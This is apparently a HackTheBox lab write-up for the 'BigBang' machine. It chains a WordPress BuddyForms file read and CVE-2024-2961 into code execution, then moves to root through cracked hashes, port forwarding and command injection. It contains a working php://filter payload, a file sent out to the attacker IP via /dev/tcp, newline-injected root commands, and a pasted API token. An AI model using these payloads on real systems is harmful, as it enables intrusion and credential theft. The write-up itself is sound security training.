---
title: BigBang
categories: [HackTheBox]
tags: [linux, cve, wordpress, portforward, passwordcracking, ]
media_subpath: /images/hackthebox_bigbang/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png'
---

## Summary
**BigBang** is a Hard-rated box that required some creative exploitation to gain a foothold. The target hosted a [WordPress](/theory/misc/wordpress) site with a vulnerable plugin that allowed unauthenticated arbitrary file read through crafted [`php://filter chains`](/theory/misc/php#php-filter-chain). Leveraging this, we exploited CVE-2024-2961, a vulnerability in iconv, to escalate the file read into remote code execution (RCE).

With initial access, we discovered another host on the internal network. By setting up [port forwarding](/theory/misc/portforward#chisel-local-port-forwarding), we were able to enumerate a `MySQL` database running on that host and identify a user with weak credentials, cracked it with `hashcat`. These credentials led us to a user that could access the box with `ssh`, where a `grafana.db` file was found, which exposed another weak password and allowed lateral movement to the `developer` user.

As `developer`, we found an [android](/theory/mobile/apk) `APK` file that could make requests to an internal service on port `9090`. This turned out to be a REST API with a [command injection](/theory/misc/cmi) vulnerability. Exploiting this flaw, we executed arbitrary commands on the system as root, ultimately gaining a root shell.

## Enumeration

We started off with a nmap scan on the IP `10.10.11.52` 

```bash
sudo nmap -sVC -Pn -oN nmap 
``` 
> Command breakdown:
> - `sudo`: We need privileged access to run the `syn` (stealth) scan
> - `-sVC`: Service and version detection
> - `-Pn`: Treat all hosts as online
> - `-oN`: Output to a file in normal `nmap` format
{: .prompt-info}

resulting on the following open ports 

> - 80
> - 22

### Nmap Scripts

```bash
80/tcp open  http    syn-ack Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://blog.bigbang.htb/
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: blog.bigbang.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80 - Web Service 

From the `nmap` scan and from accessing the web server we are redirected to `blog.bigbang.htb`, which we need to add to our `hosts` file to be able to resolve the domain name. 

![DESC](file-20250501025849205.png)

- Add to hosts

```
cat /etc/hosts
10.10.11.52 blog.bigbang.htb bigbang.htb
```

Now we can access the website

![DESC](file-20250501030633888.png)

Utilizing the `wappalyzer` plugin on the browser, we can get the following information about the web server:

![Wappalyzer_result](file-20250505212420004.png)

> - Wordpress running `blog.bigbang.htb`
> - Searching for the source code we found references to buddyform plugin

We can enumerate the wordpress website with a tool called [WpScan](https://wpscan.com/) which is a WordPress vulnerability scanner. 

```bash
docker run --rm -it --add-host blog.bigbang.htb:10.10.11.52 wpscanteam/wpscan --url http://blog.bigbang.htb --api-token UdFgwA3gMgb60U9Gi60oajzMEaEODjAlCdzhpNCOnG4 -e vp --plugins-detection aggressive
```
> Command breakdown:
> - `--rm`: Remove the container after it exits
> - `-it`: Run in interactive mode
> - `--add-host`: Add a custom host-to-IP mapping because the docker container can't access our host's `/etc/hosts` file
> - `--url`: The target URL
> - `--api-token`: The API token for the WPScan service
> - `-e vp`: Enumerate vulnerable plugins
> - `--plugins-detection` aggressive: Use aggressive detection for plugins
{: .prompt-info}

```bash
<SNIP>
[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-02-27T23:01:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt
 | [!] The version is out of date, the latest version is 2.8.17
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/, status: 200
 |
 | [!] 14 vulnerabilities identified:
 |
 | [!] Title: BuddyForms < 2.7.8 - Unauthenticated PHAR Deserialization
 |     Fixed in: 2.7.8
 |     References:
 |      - https://wpscan.com/vulnerability/a554091e-39d1-4e7e-bbcf-19b2a7b8e89f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26326
 |
 | [!] Title: BuddyForms < 2.8.9 - Unauthenticated Arbitrary File Read and Server-Side Request Forgery
 |     Fixed in: 2.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/3f8082a0-b4b2-4068-b529-92662d9be675
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32830
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/23d762e9-d43f-4520-a6f1-c920417a2436
 | Version: 2.7.7 (80% confidence)
<SNIP>
```

Looking at the possible CVEs from the version of BuddyForms, I stumbled across the following post about the [insecure `phar` deserialization](https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8) but it requires a gadget chain, which is no longer valid on the latest version. From the post, I've learned the endpoint for an unauthenticated file upload, using the following requests:

```bash
curl http://blog.bigbang.htb/wp-admin/admin-ajax.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=upload_image_from_url&url=http://10.10.14.4:8000/evil.phar&id=1&accepted_files=image/gif'
```

The upload was successful, but the `phar` deserialization was not possible on this version. Looking for other exploits , I found a [CVE-2024-2961](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1) that allows for arbitrary file read through `php://filter` and `iconv` which is enabled by default on the server. With it, it is possible to read files by appending `GIF89a` to read files

![DESC](file-20250504192033252.png)

```bash
~/tools/wrapwrap/venv/bin/python ~/tools/wrapwrap/wrapwrap.py /etc/passwd 'GIF89a' '' 100
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).

cat chain.txt

php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd%

curl http://blog.bigbang.htb/wp-admin/admin-ajax.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=upload_image_from_url&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd&id=1&accepted_files=image/gif'
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/05\/1-9.png","attachment_id":164}%

curl http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/05\/1-9.png
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi%
```

Having the file read working we need to adjust the exploit to be able to execute

- Adding the php filter and upload file logic
![DESC](file-20250504200353769.png)

- Running the exploit we see that some bytes are being cutout (probably because of the GIF89a header)
![DESC](file-20250504200252732.png)

- To avoid that we comment out every part of the code where it is passing the test to check if vulnerable
![DESC](file-20250504202505516.png)

- After that we run again to see if it is working, now we are getting elfparseerror, once again, probably because of the GIF89a header
![DESC](file-20250504202740123.png)
- Since it is a buffer exploit, it downloads the libc to get the offsets of the addresses needed for the exploit to work, since we don't need exactly the file, only the offsets from the functions (that will not be in the last bytes of the file) we can fix the bytes by appending some null bytes `0x00` to the end of the file
![DESC](file-20250504203553429.png)
- After fixing the libc, we don't get the elfparseerror anymore, but we get that the exploited failed
![DESC](file-20250504203250444.png)
- We then try to encode our payload to see if it was a problem on the encoding
![DESC](file-20250504203934803.png)
![DESC](file-20250504203915956.png)
- With the working exploit we can now get a shell on the box
![DESC](file-20250504204113251.png)

## Horizontal Privilege Escalation 

We can see that we are on a docker instance because of the hostname and because of the presence of the `.dockerenv` file on `/`
![DESC](file-20250506002454414.png)

Inside the docker, we can enumerate the webserver files, since we are running `wordpress`, we search for the `wp-config.php` which often contains the database credentials

![DESC](file-20250504204306063.png)
![DESC](file-20250504204318427.png)

From the config file we can see that the database user is `wp_user` and the password is `wp_password`, and that the host which is running is different from the one we're in.

To access this host, we need to port forward the `MySql` default port (3306) to our host. We could use various tools for this, as shown in the `Port Forward` section on the summary but I chose to use [`chisel`](https://github.com/jpillora/chisel) because it is a simple and effective tool for port forwarding.

> Note: we can quickly confirm the `3306` port open with `nc` if we had it on the machine using `nc -zv <IP> <PORT>`, we could upload a `nc` static binary but we did the `nmap` static binary to check all of the other ports.
> We could not simply run the `nmap` binary because it could not find the `scripts` folder, se we sent not only the binary but the scripts folder compressed as tar as well
{: .prompt-info}

```
www-data@8e3a72b5e980:/tmp$ chmod +x ./nmap && ./nmap 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-05-06 00:39 UTC
Unable to find nmap-services!  Resorting to /etc/services
Unable to open /etc/services for reading service information
QUITTING!
www-data@8e3a72b5e980:/tmp$ wget http://10.10.14.27:8000/nmap.tar
--2025-05-06 00:39:58--  http://10.10.14.27:8000/nmap.tar
Connecting to 10.10.14.27:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22210560 (21M) [application/x-tar]
Saving to: 'nmap.tar'

nmap.tar            100%[===================>]  21.18M  3.42MB/s    in 7.2s

2025-05-06 00:40:05 (2.94 MB/s) - 'nmap.tar' saved [22210560/22210560]

www-data@8e3a72b5e980:/tmp$

www-data@8e3a72b5e980:/tmp$ NMAPDIR=/tmp/usr/share/nmap ./nmap 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-05-02 03:24 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 172.17.0.1
Host is up (0.00061s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

After that we can port forward with chisel to access it using `mysql` client

```
./chisel server --reverse -p 8002
2025/05/02 03:28:44 server: Reverse tunnelling enabled
2025/05/02 03:28:44 server: Fingerprint 1hxj30GlqyNbVi1KQfRhht1LzUBTr/h5fiWjUsRipOQ=
2025/05/02 03:28:44 server: Listening on http://0.0.0.0:8002
2025/05/02 03:28:59 server: session#1: tun: proxy#R:3306=>172.17.0.1:3306: Listening
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@8e3a72b5e980:/tmp$ ./chisel client 10.10.14.4:8002 R:3306:172.17.0.1:3306
2025/05/02 03:28:57 client: Connecting to ws://10.10.14.4:8002
2025/05/02 03:29:00 client: Connected (Latency 307.554524ms)
```

![DESC](file-20250504204603880.png)

We can now access the db with

```
mysql -u wp_user -p -h 127.0.0.1
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 3029
Server version: 8.0.32 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
3 rows in set (0.252 sec)

MySQL [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.208 sec)

MySQL [wordpress]> describe wp_users;
+---------------------+-----------------+------+-----+---------------------+----------------+
| Field               | Type            | Null | Key | Default             | Extra          |
+---------------------+-----------------+------+-----+---------------------+----------------+
| ID                  | bigint unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)     | NO   | MUL |                     |                |
| user_pass           | varchar(255)    | NO   |     |                     |                |
| user_nicename       | varchar(50)     | NO   | MUL |                     |                |
| user_email          | varchar(100)    | NO   | MUL |                     |                |
| user_url            | varchar(100)    | NO   |     |                     |                |
| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)    | NO   |     |                     |                |
| user_status         | int             | NO   |     | 0                   |                |
| display_name        | varchar(250)    | NO   |     |                     |                |
+---------------------+-----------------+------+-----+---------------------+----------------+
10 rows in set (0.257 sec)

MySQL [wordpress]> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 |
| shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ |
+------------+------------------------------------+
2 rows in set (0.264 sec)

```
![DESC](file-20250504204657093.png)

We find hashes for some users, saving it to `hashes` file and trying to crack it we are able to crack `shawkings` password with `hashcat` using the `phpass` hash type


> We could also enumerate the database and tables using the following commands from the `php` binary present on the docker host (without port forwarding)
{: .prompt-info}

```
# Database
php -r '$c=new mysqli("172.17.0.1","wp_user","wp_password");foreach($c->query("SHOW DATABASES")as$r){echo $r["Database"]."\n";};$c->close();'
# Tables
php -r '$c=new mysqli("172.17.0.1","wp_user","wp_password","wordpress");foreach($c->query("SHOW TABLES")->fetch_all()as$r)echo$r[0]."\n";'
# Rows
php -r '$c=new mysqli("172.17.0.1","wp_user","wp_password","wordpress");$q=$c->query("SELECT * FROM wp_users");while($r=$q->fetch_assoc())print_r($r)."\n";'
```
![DESC](file-20250504204755551.png)

### Password Cracking

```bash
cat hashes
| root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 |
| shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ |

cat hashes | awk '{print $2":"$4}'
root:$P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1
shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./
```
Now cracking with hashcat

```
hashcat hashes --show --username
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

400 | phpass | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

shawking:$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics

```

## Foothold on the machine
With the obtained credentials we can now access the machine via `ssh` as `shawking`

![DESC](file-20250502033326542.png)

### Enumerating the host
Looking around for interesting files we find a `grafana.db` file on the `/opt/grafana/data/` folder. We can send this file to our host using the bash TCP socket

```bash
# Attacker
nc -lvnp 9999 > grafana.db
# Victim
shawking@bigbang:/opt/data$ cat grafana.db > /dev/tcp/10.10.14.27/9999
s
```
> Note: the `/dev/tcp` redirection is an exclusive feature of `bash` and is not available in all shells. It allows you to open a TCP connection to a specified host and port, effectively creating a socket connection.
{: .prompt-warning}

In posession of the `grafana.db` file we enumerate for sensitive informatin and we find more hashes and salt for `grafana` users

![DESC](file-20250504161501693.png)
![DESC](file-20250504164905247.png)

Using a tool called [`grafana2hashcat`](https://github.com/iamaldi/grafana2hashcat) we can convert the `hash,salt` format into a `hashcat` acceptable format

```
python ~/tools/grafana2hashcat/grafana2hashcat.py grafana_hashes

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  grafana_hashes
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:Q0ZuN3pNc1FwZg==:RBpxW9eI6SgXC+eVSxfLGd6DWi3t/ezoxlMnyx2bpr1H1w7bdCGwXZcGumFHy3GXOjQ=
sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=


[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

Looking at the email from the cracker hash user, we see that it is for the `developer` user, trying the cracked password we can login as `developer`

```
developer@bigbang:~/android$ ls
satellite-app.apk
```

Inside the `developer` home folder, there is an android `.apk` file, we can `unzip` the files from the `apk` and look for interesting strings

```bash
ls
󰗀 AndroidManifest.xml   classes.dex   META-INF   res              satellite-app.apk
 classes               kotlin        okhttp3    resources.arsc

grep -Ri bigbang.htb
grep: classes.dex: binary file matches
grep: satellite-app.apk: binary file matches
```
Using [`jadx`](https://github.com/skylot/jadx) to decompile the `apk` file we can see that there is references to an api endpoint to the `app.bigbang.htb` domain

```bash
~/tools/jadx-gui/bin/jadx classes.dex
INFO  - loading ...
INFO  - processing ...
INFO  - done
```

```bash
grep -Ri bigbang.htb
classes/sources/u/AsyncTaskC0228f.java:                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/login").openConnection();
classes/sources/u/AsyncTaskC0228f.java:                    HttpURLConnection httpURLConnection2 = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
classes/sources/q0/b.java:            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://app.bigbang.htb:9090/command").openConnection();
grep: classes.dex: binary file matches
grep: satellite-app.apk: binary file matches
```

![DESC](file-20250504171654939.png)

On the `login` endpoint we can send the `developer` credential to receive an access token
```
curl -XPOST localhost:9090/login -H 'Content-Type: application/json' -d '{"username":"developer","password":"bigbang"}'
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NjM3ODYyNSwianRpIjoiYWI0ZmM1YmQtZDcwZi00OGU1LWIwYmItYjBkYWU0NDkwMzg4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NjM3ODYyNSwiY3NyZiI6IjM3NTUxOTI4LWRkZjItNDllMS04ZTBiLTEyYTFmZjJlYTg3YSIsImV4cCI6MTc0NjM4MjIyNX0.OBDC17PeO33LSZETt_eNd9NXc-O5aJe96oc0wRclN5I"}
```

Looking at the code, we can see that we can send a `POST` request with the payload 
```json
{
"command":"send_file",
"output_file": "<file>"
}
```

While sending this command, we can montitor what the host is running using the [`pspy`](https://github.com/DominicBreuker/pspy) tool, which allows us to see the processes running on the host without needing to install anything on it. 

![DESC](file-20250504171849015.png)

We can see that the command is being executed as `root` and that it is running a `bash` shell, which allows us to run commands as root if we escape it. Trying a simple `\n` (newline) we can see that the root will run the other command

![DESC](file-20250504172008145.png)

With that in mind, we can copy the `/bin/bash` binary to the `/tmp` folder, enable the `suid` bit and then run it with the `-p` flag to get a root shell

```bash
curl -XPOST localhost:9090/command -H 'Content-Type: application/json' -d '{"command":"send_file","output_file":"/tmp/bash\ncp /bin/bash /tmp/bash"}'
```
```bash
curl -XPOST localhost:9090/command -H 'Content-Type: application/json' -d '{"command":"send_file","output_file":"/tmp/bash\nchmod 4755 /tmp/bash"}'
```

And with that we can get a root shell
![DESC](file-20250504172330057.png)

## Quick Recap 
- We started with a `php://filter` exploit to read files from the web server
- Exploited a `CVE-2024-2961` to get a reverse shell, adjusting the exploit to work with the `php` filter
- Used `chisel` to port forward 
- Enumerated the database and files on the system to gather more credentials
- Used `grafana2hashcat` to convert the `grafana` hashes to `hashcat` format
- Decompiled the `apk` file to find an internal API endpoint
- Used the API to run a command injection as `root` and get a root shell
